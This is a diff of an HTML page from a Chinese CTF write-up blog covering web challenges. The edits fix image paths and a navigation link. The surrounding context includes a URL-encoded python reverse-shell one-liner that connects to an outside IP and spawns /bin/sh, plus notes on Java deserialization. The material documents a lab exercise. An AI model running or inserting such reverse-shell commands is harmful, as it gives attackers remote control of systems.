@@ -104,7 +104,7 @@
 <p>然后开了个linux-lab，反弹shell。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c&#x3D;python3%20-c%20%27import%20socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22174.0.216.234%22,1234));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p&#x3D;subprocess.call([%22&#x2F;bin&#x2F;sh%22,%22-i%22]);%27</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2020/02/29/V/E:%5Cpaper%5Csource%5C_posts%5CV%5Cimage-20200229184920698.png" alt="image-20200229184920698"></p>
+<p><img src="/2020/02/29/V/image-20200229184920698.png" alt="image-20200229184920698"></p>
 <p>之后就是找flag了，这里又学到了linux中/proc目录内容。更详细的可以<a href="https://blog.spoock.com/2019/10/08/proc/" target="_blank" rel="noopener">参考</a>这篇文章，总结的很详细。</p>
 <p><img src="/2020/02/29/V/image-20200229185248748.png" alt="image-20200229185248748"></p>
 <p>由于ps命令不可用，这里我们就去翻一下文件夹</p>
@@ -142,7 +142,7 @@
 <p><img src="/2020/02/29/V/image-20200229194145302.png" alt="image-20200229194145302"></p>
 <h2 id="EasySpringMVC"><a href="#EasySpringMVC" class="headerlink" title="EasySpringMVC"></a>EasySpringMVC</h2><p>考点：java反序列化</p>
 <p>题目给了源码是war包，用tomcat部署后，</p>
-<p><img src="/2020/02/29/V/E:%5CMarkdown%5Cpic%5Cimage-20200301110922154.png" alt="image-20200301110922154"></p>
+<p><img src="/2020/02/29/V/image-20200301110922154.png" alt="image-20200301110922154"></p>
 <p>浏览一下功能，可以上传，但是要webmanage权限，开始以为要修改权限，上传个图片马 什么的。</p>
 <p>然后审计源码，由于之前没有做过java的题，对java的程序框架不是很了解，一边百度一边理解，<img src="/2020/02/29/V/image-20200301111336301.png" alt></p>
 <p>程序大致的框架就是这样（本人的理解），有控制器，有jsp文件，lib文件夹里面的都是引用的jar包，看了里面的jar包，没有反序列化漏洞的版本。这里的ClientinfoFilter就是一个全局过滤器，在web.xml文件中，</p>
@@ -191,9 +191,9 @@
   <nav class="article-nav">
     
     
-      <a href="/2020/02/29/V&Nwp/" class="article-nav-link">
+      <a href="/2020/02/25/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/" class="article-nav-link">
         <strong class="article-nav-caption">Older</strong>
-        <div class="article-nav-title">V&amp;N招新赛web部分题解</div>
+        <div class="article-nav-title">Javascript原型链污染</div>
       </a>
     
   </nav>
